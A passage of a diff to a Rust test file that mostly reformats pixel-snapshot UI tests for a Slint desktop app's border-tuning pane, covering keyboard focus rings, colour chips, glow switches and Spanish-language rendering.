         "the focused inactive row must render 40–60px tall (icy bands={bands:?})"
     );
 }
@@ -11702,10 +12497,7 @@ fn borders_strip_flow_renders() {
 /// the ring is the icy border around one swatch bbox (same ±40 tolerance and
 /// >30px threshold as the chip-count test, so the numeric label ink, ~58 away
 /// on red, never reads as a ring).
-fn strip_ring_chip(
-    buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>,
-    n: usize,
-) -> Option<usize> {
+fn strip_ring_chip(buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>, n: usize) -> Option<usize> {
     let mut found = None;
     for i in 0..n {
         let (x0, y0, x1, y1) = exact_color_bbox(buf, CHIP_COLORS[i], 8)?;
@@ -11737,7 +12529,7 @@ fn strip_ring_chip(
 /// never moves.
 #[test]
 fn borders_strip_keyboard_sub_navigation() {
-    use slint::{ComponentHandle as _, platform::Key};
+    use slint::{platform::Key, ComponentHandle as _};
     // 3 chips, 1 preset card: list-len 1, so the strip stop is global index 7
     // (card 0, size 1, radius 2, gap-in 3, gap-out 4, angle 5, inactive 6,
     // strip 7).
@@ -11748,11 +12540,11 @@ fn borders_strip_keyboard_sub_navigation() {
         focus_press_key(&win, Key::DownArrow);
     }
     focus_settle();
-    let at_strip = win.window().take_snapshot().expect("strip focused snapshot");
-    save_slice_png(
-        at_strip.clone(),
-        "borders_strip_kbd_focused.png",
-    );
+    let at_strip = win
+        .window()
+        .take_snapshot()
+        .expect("strip focused snapshot");
+    save_slice_png(at_strip.clone(), "borders_strip_kbd_focused.png");
     assert_eq!(
         strip_ring_chip(&at_strip, 3),
         Some(0),
@@ -11762,7 +12554,10 @@ fn borders_strip_keyboard_sub_navigation() {
     // Right cycles 0 → 1 → 2 → 0 (wraps); Left cycles back.
     focus_press_key(&win, Key::RightArrow);
     focus_settle();
-    let right1 = win.window().take_snapshot().expect("strip right-1 snapshot");
+    let right1 = win
+        .window()
+        .take_snapshot()
+        .expect("strip right-1 snapshot");
     assert_eq!(
         strip_ring_chip(&right1, 3),
         Some(1),
@@ -11771,7 +12566,10 @@ fn borders_strip_keyboard_sub_navigation() {
 
     focus_press_key(&win, Key::RightArrow);
     focus_settle();
-    let right2 = win.window().take_snapshot().expect("strip right-2 snapshot");
+    let right2 = win
+        .window()
+        .take_snapshot()
+        .expect("strip right-2 snapshot");
     assert_eq!(
         strip_ring_chip(&right2, 3),
         Some(2),
@@ -11781,10 +12579,7 @@ fn borders_strip_keyboard_sub_navigation() {
     focus_press_key(&win, Key::RightArrow);
     focus_settle();
     let wrapped = win.window().take_snapshot().expect("strip wrap snapshot");
-    save_slice_png(
-        wrapped.clone(),
-        "borders_strip_kbd_wrapped.png",
-    );
+    save_slice_png(wrapped.clone(), "borders_strip_kbd_wrapped.png");
     assert_eq!(
         strip_ring_chip(&wrapped, 3),
         Some(0),
@@ -11793,7 +12588,10 @@ fn borders_strip_keyboard_sub_navigation() {
 
     focus_press_key(&win, Key::LeftArrow);
     focus_settle();
-    let left_wrap = win.window().take_snapshot().expect("strip left-wrap snapshot");
+    let left_wrap = win
+        .window()
+        .take_snapshot()
+        .expect("strip left-wrap snapshot");
     assert_eq!(
         strip_ring_chip(&left_wrap, 3),
         Some(2),
@@ -11805,7 +12603,10 @@ fn borders_strip_keyboard_sub_navigation() {
     focus_settle();
     focus_press_key(&win, Key::LeftArrow);
     focus_settle();
-    let back = win.window().take_snapshot().expect("strip back-to-first snapshot");
+    let back = win
+        .window()
+        .take_snapshot()
+        .expect("strip back-to-first snapshot");
     assert_eq!(
         strip_ring_chip(&back, 3),
         Some(0),
@@ -11821,20 +12622,16 @@ fn borders_strip_keyboard_sub_navigation() {
         0,
         "Enter on the strip must open the picker for the active chip"
     );
-    let open = win.window().take_snapshot().expect("strip picker-open snapshot");
-    save_slice_png(
-        open.clone(),
-        "borders_strip_kbd_picker_open.png",
-    );
+    let open = win
+        .window()
+        .take_snapshot()
+        .expect("strip picker-open snapshot");
+    save_slice_png(open.clone(), "borders_strip_kbd_picker_open.png");
 
     // Esc closes the picker; the strip stays put.
     focus_press_key(&win, Key::Escape);
     focus_settle();
-    assert_eq!(
-        win.get_tune_editing_slot(),
-        -1,
-        "Esc must close the picker"
-    );
+    assert_eq!(win.get_tune_editing_slot(), -1, "Esc must close the picker");
 }
 
 /// Q1 — `strip-active-chip` used to be kept in range only by `strip-cycle`
@@ -11848,7 +12645,7 @@ fn borders_strip_keyboard_sub_navigation() {
 /// disappears must close rather than linger on a dead channel.
 #[test]
 fn borders_strip_ring_and_picker_clamp_when_slots_shrink() {
-    use slint::{ComponentHandle as _, ModelRc, platform::Key, SharedString, VecModel};
+    use slint::{platform::Key, ComponentHandle as _, ModelRc, SharedString, VecModel};
     let win = borders_tune_pane_fixture(&[
         "p:primary",
         "p:secondary",
@@ -11921,7 +12718,7 @@ fn borders_strip_ring_and_picker_clamp_when_slots_shrink() {
 /// that was never rendered. The counted stops must match the mounted controls.
 #[test]
 fn borders_tune_zero_colours_has_no_ghost_stops() {
-    use slint::{ComponentHandle as _, platform::Key};
+    use slint::{platform::Key, ComponentHandle as _};
     let win = borders_tune_pane_fixture(&[]);
 
     // Record whether the (unmounted) add control ever fires. The window is
@@ -11966,10 +12763,7 @@ fn borders_tune_zero_colours_has_no_ghost_stops() {
     win.set_panel_kbd_preview_index(1 + 6);
     focus_settle();
     let focused = win.window().take_snapshot().expect("zero-colour glow stop");
-    save_slice_png(
-        focused.clone(),
-        "borders_tune_zero_colours_glow_stop.png",
-    );
+    save_slice_png(focused.clone(), "borders_tune_zero_colours_glow_stop.png");
     assert!(
         focused_row_span(&focused, 56, 68).is_some(),
         "the zero-colour glow-toggle stop must paint a focused 64px row"
@@ -12058,7 +12852,10 @@ fn borders_tune_pane_renders_with_dynamic_slots() {
 
     // Verify: icy focus pixels should be present (panel has focus)
     let icy = count_icy_pixels(&snapshot);
-    assert!(icy > 500, "borders tune pane must have focus ring (icy pixels={icy})");
+    assert!(
+        icy > 500,
+        "borders tune pane must have focus ring (icy pixels={icy})"
+    );
 
     // Verify: check that text content exists by looking for non-background pixels
     // in the content area (x > 360, the panel starts after the rail)
@@ -12090,9 +12887,8 @@ fn borders_tune_pane_renders_with_dynamic_slots() {
     let mut boxes = Vec::new();
     for (i, rgb) in CHIP_COLORS.iter().take(3).enumerate() {
         let painted = count_exact_color(&snapshot, *rgb, 8);
-        let bbox = exact_color_bbox(&snapshot, *rgb, 8).unwrap_or_else(|| {
-            panic!("chip {} must paint its resolved colour {rgb:?}", i + 1)
-        });
+        let bbox = exact_color_bbox(&snapshot, *rgb, 8)
+            .unwrap_or_else(|| panic!("chip {} must paint its resolved colour {rgb:?}", i + 1));
         // A 16×16 swatch paints ~196px through its 1px border and 4px radius
         // (measured), NOT up to 400: the band pins the size instead of merely
         // accepting it, so a chip that grew into a full card would fail here.
@@ -12146,10 +12942,16 @@ fn borders_glow_group_renders_addable_and_expanded() {
     win.set_panel_section(1);
 
     // Minimal preset data
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Test")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("test")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Test",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("test.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test.lua",
+    )])));
 
     // 2 color slots, glow DISABLED
     win.set_tune_active_colors(ModelRc::new(VecModel::from(vec![
@@ -12177,12 +12979,17 @@ fn borders_glow_group_renders_addable_and_expanded() {
     for y in 0..h {
         for x in 360..w {
             let idx = (y * w + x) * 4;
-            if bytes[idx + 3] > 200 && (bytes[idx] > 40 || bytes[idx + 1] > 40 || bytes[idx + 2] > 40) {
+            if bytes[idx + 3] > 200
+                && (bytes[idx] > 40 || bytes[idx + 1] > 40 || bytes[idx + 2] > 40)
+            {
                 content += 1;
             }
         }
     }
-    assert!(content > 5000, "glow addable state must render content (pixels={content})");
+    assert!(
+        content > 5000,
+        "glow addable state must render content (pixels={content})"
+    );
 
     // Now enable glow and render again
     win.set_tune_glow_enabled(true);
@@ -12195,7 +13002,10 @@ fn borders_glow_group_renders_addable_and_expanded() {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
 
-    let snapshot2 = win.window().take_snapshot().expect("glow-expanded snapshot");
+    let snapshot2 = win
+        .window()
+        .take_snapshot()
+        .expect("glow-expanded snapshot");
     save_slice_png(snapshot2.clone(), "borders_glow_expanded.png");
 
     let bytes2 = snapshot2.as_bytes();
@@ -12203,12 +13013,17 @@ fn borders_glow_group_renders_addable_and_expanded() {
     for y in 0..h {
         for x in 360..w {
             let idx = (y * w + x) * 4;
-            if bytes2[idx + 3] > 200 && (bytes2[idx] > 40 || bytes2[idx + 1] > 40 || bytes2[idx + 2] > 40) {
+            if bytes2[idx + 3] > 200
+                && (bytes2[idx] > 40 || bytes2[idx + 1] > 40 || bytes2[idx + 2] > 40)
+            {
                 content2 += 1;
             }
         }
     }
-    assert!(content2 > 5000, "glow expanded state must render content (pixels={content2})");
+    assert!(
+        content2 > 5000,
+        "glow expanded state must render content (pixels={content2})"
+    );
 }
 
 /// T1 — the glow block's on/off control is a SWITCH, the same pill the left
@@ -12258,8 +13073,9 @@ fn borders_glow_switch_renders_off_and_on() {
     );
 
     let on_green = count_exact_color(&on, GREEN, 6);
-    let bbox = exact_color_bbox(&on, GREEN, 6)
-        .unwrap_or_else(|| panic!("the ON glow switch must paint accent-green (pixels={on_green})"));
+    let bbox = exact_color_bbox(&on, GREEN, 6).unwrap_or_else(|| {
+        panic!("the ON glow switch must paint accent-green (pixels={on_green})")
+    });
     let (x0, y0, x1, y1) = bbox;
     // A 40×22 pill minus its 16×16 dark knob paints a few hundred green pixels
     // in a small box: the pill's own size. A stray green anywhere else in the
@@ -12371,10 +13187,16 @@ fn borders_tune_full_focus_reaches_last_and_middle() {
     win.set_is_panel_open(true);
     win.set_is_mutating(false);
     win.set_panel_section(1);
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Test")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("test")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Test",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("test.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test.lua",
+    )])));
     win.set_tune_active_colors(ModelRc::new(VecModel::from(vec![
         SharedString::from("p:primary"),
         SharedString::from("p:secondary"),
@@ -12402,7 +13224,10 @@ fn borders_tune_full_focus_reaches_last_and_middle() {
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let mid = win.window().take_snapshot().expect("borders tune middle snapshot");
+    let mid = win
+        .window()
+        .take_snapshot()
+        .expect("borders tune middle snapshot");
     save_slice_png(mid.clone(), "borders_tune_focus_middle.png");
 
     // Q5: the "middle" identity is the glow-ENABLE toggle (tune-local 6), not
@@ -12449,10 +13274,7 @@ fn borders_tune_full_focus_reaches_last_and_middle() {
         .window()
         .take_snapshot()
         .expect("borders tune neighbour snapshot");
-    save_slice_png(
-        neighbour.clone(),
-        "borders_tune_focus_neighbour.png",
-    );
+    save_slice_png(neighbour.clone(), "borders_tune_focus_neighbour.png");
     let (n_top, n_bottom) = focused_row_span(&neighbour, 56, 68).unwrap_or_else(|| {
         panic!(
             "the neighbouring Range stop must paint two icy edges ~64px apart; icy bands={:?}",
@@ -12477,13 +13299,25 @@ fn borders_tune_full_focus_reaches_last_and_middle() {
     for _ in 0..80 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let end = win.window().take_snapshot().expect("borders tune last snapshot");
+    let end = win
+        .window()
+        .take_snapshot()
+        .expect("borders tune last snapshot");
     save_slice_png(end.clone(), "borders_tune_focus_last.png");
 
     let diff = count_buffer_diff(&mid, &end);
-    assert!(diff > 2000, "middle and last focus must scroll apart — got {diff}");
-    assert!(count_icy_pixels(&mid) > 200, "middle focus must carry the icy ring");
-    assert!(count_icy_pixels(&end) > 200, "last focus must carry the icy ring");
+    assert!(
+        diff > 2000,
+        "middle and last focus must scroll apart — got {diff}"
+    );
+    assert!(
+        count_icy_pixels(&mid) > 200,
+        "middle focus must carry the icy ring"
+    );
+    assert!(
+        count_icy_pixels(&end) > 200,
+        "last focus must carry the icy ring"
+    );
 }
 
 // ── T3a — the tune scroll-follow must follow REAL block geometry ──────
@@ -12547,10 +13381,16 @@ fn borders_tune_glow_fixture() -> crate::MainWindow {
     win.set_is_panel_open(true);
     win.set_is_mutating(false);
     win.set_panel_section(1);
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Test")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("test")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Test",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("test.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test.lua",
+    )])));
     win.set_tune_active_colors(ModelRc::new(VecModel::from(vec![
         SharedString::from("p:primary"),
         SharedString::from("p:secondary"),
@@ -12898,13 +13738,17 @@ fn borders_geometry_group_paints_a_container_and_a_description_above_its_control
     // function `main()` calls), so this is the Spanish render, not a claim.
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("geometry container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("geometry container, Spanish");
     save_slice_png(es.clone(), "borders_geometry_container_header_es.png");
 
     let es_top = icy_band_pair_top(&es, 88, 104);
     let es_y0 = es_top.saturating_sub(HEADER_WINDOW);
     let es_muted = count_color_in_box(&es, TEXT_MUTED, 30, 1060, es_y0, 1900, es_top);
-    let repaint = count_buffer_diff_region(&en, &es, 1060, en_y0.min(es_y0), 1900, en_top.max(es_top));
+    let repaint =
+        count_buffer_diff_region(&en, &es, 1060, en_y0.min(es_y0), 1900, en_top.max(es_top));
     println!("[T3b] Spanish header strip: text-muted={es_muted} repaint vs English={repaint}");
     assert!(
         es_muted > 150,
@@ -13049,7 +13893,14 @@ fn t3c1_copy_windows(
             1900,
             top,
         ),
-        count_buffer_diff_region(before, after, 1060, bottom + 6, 1900, bottom + HEADER_WINDOW + 6),
+        count_buffer_diff_region(
+            before,
+            after,
+            1060,
+            bottom + 6,
+            1900,
+            bottom + HEADER_WINDOW + 6,
+        ),
     )
 }
 
@@ -13195,7 +14046,8 @@ fn borders_angle_group_paints_a_container_with_a_header_around_its_control() {
     let (t_top, t_bottom) = focused_row_span(&titled, 88, 104)
         .unwrap_or_else(|| panic!("the titled frame must still paint the lit angle row"));
     let (title_header, _) = t3c1_copy_windows(&marked, &titled, t_top, t_bottom);
-    let title_in_row = count_buffer_diff_region(&marked, &titled, 1060, t_top + 4, 1900, t_bottom - 4);
+    let title_in_row =
+        count_buffer_diff_region(&marked, &titled, 1060, t_top + 4, 1900, t_bottom - 4);
     println!("[T3c-1 angle] title marker: header={title_header} inside-the-row={title_in_row}");
     assert!(
         title_header > 60,
@@ -13214,7 +14066,10 @@ fn borders_angle_group_paints_a_container_with_a_header_around_its_control() {
     // uses (`panel_i18n::apply_borders`), not a claim about the JSON.
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("angle container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("angle container, Spanish");
     save_slice_png(es.clone(), "borders_t3c1_angle_group_es.png");
     let es_top = focused_row_span(&es, 88, 104)
         .expect("the Spanish frame must still paint the lit angle row")
@@ -13328,9 +14183,7 @@ fn borders_inactive_group_paints_a_container_with_a_header_around_its_control() 
         .unwrap_or_else(|| panic!("the marked frame must still paint the lit inactive row"));
     let (title_header, _) = t3c1_copy_windows(&en, &titled, t_top, t_bottom);
     let title_in_row = count_buffer_diff_region(&en, &titled, 1060, t_top + 4, 1900, t_bottom - 4);
-    println!(
-        "[T3c-1 inactive] title marker: header={title_header} inside-the-row={title_in_row}"
-    );
+    println!("[T3c-1 inactive] title marker: header={title_header} inside-the-row={title_in_row}");
     assert!(
         title_header > 60,
         "the title must paint INSIDE the container's header: marking it changed only \
@@ -13346,12 +14199,17 @@ fn borders_inactive_group_paints_a_container_with_a_header_around_its_control() 
     // …and the description, the same way.
     t.set_inactive_desc(slint::SharedString::from("MARKER-T3C1-INACTIVE-DESC"));
     settle_frames(8);
-    let described = win.window().take_snapshot().expect("inactive description marked");
+    let described = win
+        .window()
+        .take_snapshot()
+        .expect("inactive description marked");
     save_slice_png(described.clone(), "borders_t3c1_inactive_desc_marked.png");
     let (d_top, d_bottom) = focused_row_span(&described, 48, 62)
         .unwrap_or_else(|| panic!("the described frame must still paint the lit inactive row"));
     let (desc_header, desc_below) = t3c1_copy_windows(&titled, &described, d_top, d_bottom);
-    println!("[T3c-1 inactive] description marker: header={desc_header} under-the-row={desc_below}");
+    println!(
+        "[T3c-1 inactive] description marker: header={desc_header} under-the-row={desc_below}"
+    );
     assert!(
         desc_header > 60,
         "the description must paint INSIDE the container's header: marking it changed only \
@@ -13366,7 +14224,10 @@ fn borders_inactive_group_paints_a_container_with_a_header_around_its_control() 
     // Spanish, through the production i18n path.
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("inactive container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("inactive container, Spanish");
     save_slice_png(es.clone(), "borders_t3c1_inactive_group_es.png");
     let es_top = focused_row_span(&es, 48, 62)
         .expect("the Spanish frame must still paint the lit inactive row")
@@ -13431,7 +14292,8 @@ fn borders_save_group_paints_a_container_with_a_header_around_its_form() {
             color_row_bands(&en, ICY, 40, 300)
         )
     });
-    let (left, right) = icy_span_at(&en, top).expect("the name field's ring must paint its top edge");
+    let (left, right) =
+        icy_span_at(&en, top).expect("the name field's ring must paint its top edge");
     let y0 = top.saturating_sub(HEADER_WINDOW);
     let (card, cyan, beside) = (
         count_color_in_box(&en, BG_CARD, 4, 1060, y0, 1900, top),
@@ -13498,9 +14360,7 @@ fn borders_save_group_paints_a_container_with_a_header_around_its_form() {
         .unwrap_or_else(|| panic!("the titled frame must still paint the lit name field"));
     let (title_header, _) = t3c1_copy_windows(&marked, &titled, t_top, t_bottom);
     let title_in_row = count_buffer_diff_region(&marked, &titled, 1060, t_top + 40, 1900, t_bottom);
-    println!(
-        "[T3c-1 save] heading marker: header={title_header} inside-the-form={title_in_row}"
-    );
+    println!("[T3c-1 save] heading marker: header={title_header} inside-the-form={title_in_row}");
     assert!(
         title_header > 60,
         "the heading must paint INSIDE the container's header: marking it changed only \
@@ -13548,7 +14408,10 @@ fn borders_save_group_paints_a_container_with_a_header_around_its_form() {
     // arrive from `i18n/es.json`, or the header paints English forever.
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("save container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("save container, Spanish");
     save_slice_png(es.clone(), "borders_t3c1_save_group_es.png");
     let es_top = button_ring_top(&es);
     let es_muted = count_color_in_box(
@@ -13757,7 +14620,9 @@ const CONTAINER_HEADER_MAX: usize = 110;
 /// `(top, bottom)` of the strip's active chip: the one narrow icy band pair a
 /// chip's own height (32px plus its 2px borders) apart. [`strip_chip_ring_top`]
 /// is its top edge, kept for the callers that only need that.
-fn strip_chip_ring_span(buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>) -> Option<(usize, usize)> {
+fn strip_chip_ring_span(
+    buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>,
+) -> Option<(usize, usize)> {
     let bands = narrow_icy_bands(buf, CHIP_RING_MIN_INK, CHIP_RING_MAX_INK);
     let mut best: Option<(usize, usize)> = None;
     for i in 0..bands.len() {
@@ -13883,7 +14748,10 @@ fn borders_active_colors_group_paints_a_container_with_a_header_around_the_strip
     // `main()` calls (`panel_i18n::apply_borders`), not a claim about the JSON.
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("active container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("active container, Spanish");
     save_slice_png(es.clone(), "borders_t3c2_active_group_es.png");
     let es_chip = strip_chip_ring_span(&es)
         .expect("the Spanish frame must still paint the strip's chip ring")
@@ -14034,7 +14902,10 @@ fn borders_slots_group_paints_a_container_with_a_header_around_the_row() {
 
     crate::panel_i18n::apply_borders(&win, &crate::tr::Tr::with_lang("es"));
     settle_frames(80);
-    let es = win.window().take_snapshot().expect("slot container, Spanish");
+    let es = win
+        .window()
+        .take_snapshot()
+        .expect("slot container, Spanish");
     save_slice_png(es.clone(), "borders_t3c2_slots_group_es.png");
     let es_band = fill_top_above(&es, by0);
     let (es_cyan, es_muted) = (
@@ -14097,7 +14968,8 @@ fn borders_glow_group_paints_a_container_with_a_header_around_the_fold() {
             color_row_bands(&en, ICY, 40, 300)
         )
     });
-    let (left, right) = icy_span_at(&en, top).expect("the glow header's ring must paint its top edge");
+    let (left, right) =
+        icy_span_at(&en, top).expect("the glow header's ring must paint its top edge");
     let band_top = fill_top_above(&en, top);
     let (beside, cyan, muted) = (
         count_color_in_box(
@@ -14162,7 +15034,10 @@ fn borders_glow_group_paints_a_container_with_a_header_around_the_fold() {
     let mut rings: Vec<(i32, usize, usize)> = Vec::new();
     for local in 9..=13 {
         let frame = render_tune_local_stop(&win, local);
-        save_slice_png(frame.clone(), &format!("borders_t3c2_glow_stop_{local}.png"));
+        save_slice_png(
+            frame.clone(),
+            &format!("borders_t3c2_glow_stop_{local}.png"),
+        );
         let (t, b) = focused_ring_span(&frame, 54, 68).unwrap_or_else(|| {
             panic!(
                 "glow stop {local} must still paint the ring of its lit row: icy bands={:?}",
@@ -14294,7 +15169,10 @@ fn borders_colour_swatches_are_vertically_centred_in_their_containers() {
     // header stop, the same seat `borders_glow_switch_renders_off_and_on` uses.
     win.set_panel_kbd_preview_index(1 + 9);
     settle_frames(80);
-    let shot = win.window().take_snapshot().expect("colour swatch snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("colour swatch snapshot");
     save_slice_png(shot.clone(), "borders_colour_swatches.png");
 
     // (1) A compact colour row: its own 1px `HveColors.border` hairlines are the
@@ -14333,8 +15211,8 @@ fn borders_colour_swatches_are_vertically_centred_in_their_containers() {
     // (2) The strip chip: its 2px icy ring is the box the swatch lives in.
     let (sx0, sy0, sx1, sy1) = exact_color_bbox(&shot, RED, 6)
         .expect("the first strip chip must paint its resolved colour");
-    let (chip_top, chip_bottom) = strip_chip_ring_span(&shot)
-        .expect("the active strip chip must paint its 2px icy ring");
+    let (chip_top, chip_bottom) =
+        strip_chip_ring_span(&shot).expect("the active strip chip must paint its 2px icy ring");
     let chip_height = chip_bottom - chip_top + 2;
     assert!(
         (30..=34).contains(&chip_height),
@@ -14403,7 +15281,10 @@ fn borders_colour_swatches_are_vertically_centred_in_their_containers() {
     settle_frames(4);
     win.set_panel_kbd_preview_index(1 + 9);
     settle_frames(80);
-    let stacked = win.window().take_snapshot().expect("stacked glow row snapshot");
+    let stacked = win
+        .window()
+        .take_snapshot()
+        .expect("stacked glow row snapshot");
     save_slice_png(stacked.clone(), "borders_colour_swatches_stacked.png");
     // `focused_row_span`, not `focused_ring_span`: the narrow pane's ring is
     // ~460px wide, under the 600-icy-pixels-per-row the wider helper demands,
@@ -14787,7 +15668,11 @@ impl CardCentring {
             ));
         }
         for (what, span, bound) in [
-            ("name line", if name_centred { self.name } else { None }, 3usize),
+            (
+                "name line",
+                if name_centred { self.name } else { None },
+                3usize,
+            ),
             ("★ badge", self.badge, 3usize),
             ("action buttons", self.buttons, 1usize),
         ] {
@@ -14827,7 +15712,15 @@ fn measure_card(
     let row_right = box_right - 14;
     let row_left = row_right + 1 - row_w;
     let switch = narrow_ink_row_run(
-        buf, face, 4, box_top, box_bottom, row_left, row_left + 39, 8, 34,
+        buf,
+        face,
+        4,
+        box_top,
+        box_bottom,
+        row_left,
+        row_left + 39,
+        8,
+        34,
     )
     .unwrap_or_else(|| {
         panic!(
@@ -14868,7 +15761,9 @@ fn measure_card(
         (name, badge)
     } else {
         (
-            ink_span_in_band(buf, name_ink, 12, box_top, box_bottom, text_left, text_right),
+            ink_span_in_band(
+                buf, name_ink, 12, box_top, box_bottom, text_left, text_right,
+            ),
             None,
         )
     };
@@ -14922,7 +15817,8 @@ fn glow_row_centring_problems(
                      {row_centre} (row {row_top}..{row_bottom}, pill {pill_top}..{pill_bottom})"
                 ));
             }
-            if pill_bottom - pill_top + 1 != 22 || pill_top <= row_top || pill_bottom >= row_bottom {
+            if pill_bottom - pill_top + 1 != 22 || pill_top <= row_top || pill_bottom >= row_bottom
+            {
                 problems.push(format!(
                     "the {state} glow switch pill must paint its whole 22px face INSIDE the row, \
                      but it spans {pill_top}..{pill_bottom} in {row_top}..{row_bottom}"
@@ -15004,10 +15900,16 @@ fn borders_tune_glow_color_cards_render_inside_their_box() {
     win.set_is_panel_open(true);
     win.set_is_mutating(false);
     win.set_panel_section(1);
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Test")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("test")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Test",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("test.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test.lua",
+    )])));
     win.set_tune_active_colors(ModelRc::new(VecModel::from(vec![
         SharedString::from("p:primary"),
         // A CUSTOM value: the label must read "Custom" and the chip must show
@@ -15098,7 +16000,6 @@ fn borders_tune_glow_color_cards_render_inside_their_box() {
         "the header status must change when there are unsaved edits"
     );
 }
-
 
 /// T2 — the glow body FOLDS open. It used to be `if root.glow-enabled : glow-body
 /// := VerticalLayout { … }`, an element CREATED by the `if`, so it came up at
@@ -15483,7 +16384,10 @@ fn body_card_rows(
 ///     row's own ring. Anchored to that ring rather than to a position in the row
 ///     list, which is what let a container elsewhere in the pane move this test's
 ///     landmarks (T3c-1: closed 856/561 for the same read).
-fn glow_block_top(buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>, header_holds_keyboard: bool) -> usize {
+fn glow_block_top(
+    buf: &slint::SharedPixelBuffer<slint::Rgba8Pixel>,
+    header_holds_keyboard: bool,
+) -> usize {
     let ring_top = focused_row_span(buf, 60, 68)
         .unwrap_or_else(|| {
             panic!(
@@ -15810,10 +16714,16 @@ fn borders_tune_custom_picker_opens_for_one_channel() {
     win.set_is_panel_open(true);
     win.set_is_mutating(false);
     win.set_panel_section(1);
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Test")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("test")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Test",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("test.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "test.lua",
+    )])));
     win.set_tune_active_colors(ModelRc::new(VecModel::from(vec![
         SharedString::from("p:primary"),
         SharedString::from("c:ff8800ff"),
@@ -15951,11 +16861,12 @@ fn borders_list_pane_scrolls_with_the_mouse_wheel() {
 
     // Wheel over the LIST pane (LEFT half of the content area: the preset list
     // sits next to the rail, the tune block on the right).
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerScrolled {
-        position: slint::LogicalPosition::new(700.0, 620.0),
-        delta_x: 0.0,
-        delta_y: -180.0,
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerScrolled {
+            position: slint::LogicalPosition::new(700.0, 620.0),
+            delta_x: 0.0,
+            delta_y: -180.0,
+        });
     // Measure the response over the first frames. `animate viewport-y {
     // duration: 250ms }` sits on the same property the wheel writes, so a wheel
     // tick does not move the content 1:1 — it starts an eased 250ms animation
@@ -16004,9 +16915,10 @@ fn borders_list_pane_scrolls_with_the_mouse_wheel() {
     // comparison by ~37000 ink on its own (measured). The follow is what this
     // assertion is about, not where the cursor happens to sit.
     let park = |w: &crate::MainWindow| {
-        w.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-            position: slint::LogicalPosition::new(1250.0, 30.0),
-        });
+        w.window()
+            .dispatch_event(slint::platform::WindowEvent::PointerMoved {
